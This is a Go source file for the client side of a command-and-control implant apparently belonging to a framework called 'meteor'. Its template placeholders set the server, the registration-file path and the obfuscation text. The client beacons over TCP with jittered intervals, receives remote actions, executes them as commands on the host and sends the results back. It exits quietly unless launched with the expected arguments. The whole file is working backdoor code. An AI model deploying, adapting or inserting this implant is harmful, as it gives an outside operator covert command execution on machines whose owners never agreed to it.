package main

import (
	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"net"
	"os"
)

// SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
var SERVER = "$$SERVER$$"

// INTERVAL is how long to sleep between callbacks
var INTERVAL = 1234123499

// DELTA is the jitter/variation in interval per cycle
var DELTA = 4321432199

// REGFILE is the path to the disk location where the registration file will be kept (ex: `/etc/ botconf.txt`)
var REGFILE = "$$REGFILE$$"

// OBFTEXT is the obfuscation text that will be used when generating the regfile
var OBFTEXT = "$$OBFTEXT$$"

func main() {
	if len(os.Args) != 2 && len(os.Args) != 3 {
		os.Exit(0)
	}
	for {
		var payload []byte
		regstat := cUtils.CheckRegStatus(REGFILE)
		if regstat {
			payload = cUtils.GenCheckin(REGFILE, OBFTEXT)
		} else {
			payload = cUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
		}
		conn, err := net.Dial("tcp", SERVER)
		if err != nil {
			endCheck()
			continue
		}
		conn.Write(payload)
		data := make([]byte, 16384)
		conn.Read(data)
		resp := &mcs.MCS{}
		err = proto.Unmarshal(data, resp)
		if err != nil {
			endCheck()
			continue
		}
		mode := resp.GetMode()
		if mode == "0" {
			endCheck()
			continue
		}
		actions := resp.GetActions()
		for _, acn := range actions {
			uid := acn.GetUuid()
			mod := acn.GetMode()
			args := acn.GetArgs()
			acnOut := cUtils.ExecCommand(mod, args)
			acnResp := &mcs.MCS{
				Uuid:   uid,
				Result: acnOut,
			}
			acnData, _ := proto.Marshal(acnResp)
			conn.Write(acnData)
			acnAck := make([]byte, 512)
			conn.Read(acnAck)	// read the "Add response" status, even tho we don't check it rn
		}
		endCheck()
	}
}

func endCheck() {
	if len(os.Args) == 3 {
		os.Exit(0)
	}
}
